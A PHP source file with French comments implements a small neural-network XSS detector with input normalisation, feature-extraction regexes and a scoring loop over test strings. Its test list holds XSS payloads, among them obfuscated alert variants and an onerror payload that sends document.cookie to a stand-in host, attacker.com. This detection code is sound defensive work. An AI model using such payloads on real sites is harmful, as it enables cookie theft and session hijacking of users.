<?php

// ===========================================
//  MINI RESEAU NEURONAL XSS
// ===========================================

// !!!!!!!
//L'extraction des features doit être strictement identique à celle utilisée pendant l'entraînement.
//La même fonction de normalisation, le même ordre des features et les mêmes transformations doivent être conservés. 
//Toute différence entre l'entraînement et la prédiction fausse les résultats du modèle.
// !!!!!!!

// Le nombre de neurones cachés est défini dans l'architecture du modèle.
// La partie prédiction s'adapte automatiquement à cette valeur via
// le paramètre "hidden_units" du modèle chargé.
// Aucune modification du code n'est nécessaire si le nombre de neurones cachés change.


$model = json_decode( file_get_contents("modele_xss.json"), true);
if (json_last_error() !== JSON_ERROR_NONE) {
    die('Erreur JSON: ' . json_last_error_msg());
}




// ============================
// Normalisation texte
// ============================

function normalize_input(string $s): string
{
    $old = "";
    $pass = 0;

    // Décodage URL multiple (%3C -> <)
    while ($s !== $old && $pass < 3) {
        $old = $s;
        $s = rawurldecode($s);
        $pass++;
    }

    // Décodage HTML (&lt; -> <)
    $s = html_entity_decode($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');

    // Décodage Unicode JavaScript (\u003C -> <)
    $s = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($m) {
        return mb_convert_encoding(pack("H*", $m[1]), "UTF-8", "UTF-16BE");
    }, $s);

    return $s;
}




// ============================
// Extraction features
// ============================

function extract_features(string $s): array
{
    $normalized = normalize_input($s);
    $lower = strtolower($normalized);

    return [

        // =====================
        // Taille
        // =====================

        strlen($s),

        // =====================
        // HTML
        // =====================

        substr_count($s, '<'),
        substr_count($s, '>'),

        // =====================
        // Encodages (sur brut)
        // =====================

        substr_count($s, '%'),
        preg_match_all('/&#\d+;|&#x[0-9a-f]+;|&[a-z]+;/i', $s),
        preg_match_all('/\\\\u[0-9a-f]{4}/i', $s),
        preg_match_all('/\\\\x[0-9a-f]{2}/i', $s),
        preg_match_all('/\\\\[0-7]{1,3}/', $s),

        // =====================
        // Balises dangereuses
        // =====================

        preg_match('/<(script|svg|img|iframe|object|embed|math)\b/i', $lower) ? 1 : 0,

        // =====================
        // Attributs onxxx=
        // =====================

        preg_match_all('/\bon[a-z]+\s*=/i', $lower) > 0 ? 1 : 0,
        preg_match_all('/\bon[a-z]+\s*=/i', $lower),

        // =====================
        // Schémas URI dangereux
        // =====================

        preg_match('/javascript\s*:/i', $lower) ? 1 : 0,
        preg_match('/data\s*:/i', $lower) ? 1 : 0,

        // =====================
        // Fonctions JavaScript
        // =====================

        preg_match(
            '/\b(alert|eval|confirm|prompt|settimeout|setinterval|function|constructor|atob|btoa|unescape|fromcharcode)\b/i',
            $lower
        ) ? 1 : 0,

        // =====================
        // Commentaires
        // =====================

        preg_match('/<!--|-->|\/\*|\*\/|\/\//', $s) ? 1 : 0,

        // =====================
        // Ratio caractères spéciaux
        // =====================

        strlen($s) ? preg_match_all('/[^a-z0-9\s]/i', $s) / strlen($s) : 0
    ];
}




// ============================
// Activation
// ============================

//On ne garde que si valeur positive, sinon on met 0
function relu($x)
{
    return $x > 0 ? $x : 0;
}

//Transforme n'importe quel nombre en un scrore en 0 et 1
function sigmoid($x)
{
    return 1 / (1 + exp(-$x));
}




// ============================
// Prediction depuis modèle JSON
// ============================

function predict_from_model(string $text, array $model): float
{
    $x = extract_features($text);

    // =========================
    // Normalisation identique entraînement
    // =========================

    $n_features = count($model["features"]);

    for ($i = 0; $i < $n_features; $i++) {

        $std = $model["std"][$i];

		if ($std > 0) {
			$x[$i] = ($x[$i] - $model["mean"][$i]) / $std;
		} else {
			$x[$i] = 0.0;
		}

    }




    // =========================
    // Couche cachée
    // =========================

    $h = [];

    for ($j = 0; $j < $model["hidden_units"]; $j++) {

        $s = $model["bias_hidden"][$j];

        for ($i = 0; $i < $n_features; $i++) {
            $s += $x[$i] * $model["weights_hidden"][$j][$i];
        }

        $h[$j] = relu($s);
    }




    // =========================
    // Couche sortie
    // =========================

    $out = $model["bias_output"];

    for ($j = 0; $j < $model["hidden_units"]; $j++) {
        $out += $h[$j] * $model["weights_output"][$j];
    }

    // Renvoi un score compris entre 0 et 1
    return sigmoid($out);
}


function is_xss(string $text, array $model): bool
{
    return predict_from_model($text, $model) >= $model["threshold"];
}




// ============================
// Tests
// ============================

$tests = [
"<script>alert(1)</script>",
'<img src=x onerror="&#x61;lert(1)">',
"<img src=\"x\" onerror=\"document.location='http://attacker.com/steal?cookie='+document.cookie\">",
"<gg onload=\"alert('titi')\">test</gg>",
"<img src=x oNeRrOr=\"alert('tata')\">",
"top['al\x65rt'](1)",
"top[8680439..toString(30)](1)",
"Bonjour, je souhaite modifier mon profil utilisateur avec mon adresse email.",
"<p>Nouvelle adresse email : <strong>utilisateur@example.com</strong></p>",
];





foreach ($tests as $t) {

    $score = predict_from_model($t, $model);

    echo "<hr>";
    echo htmlspecialchars($t);
    echo "<br>";
    echo "Score : " . round($score, 4);
    echo "<br>";

    echo $score >= $model["threshold"]
        ? "⚠️ XSS"
        : "✅ OK";
}

?>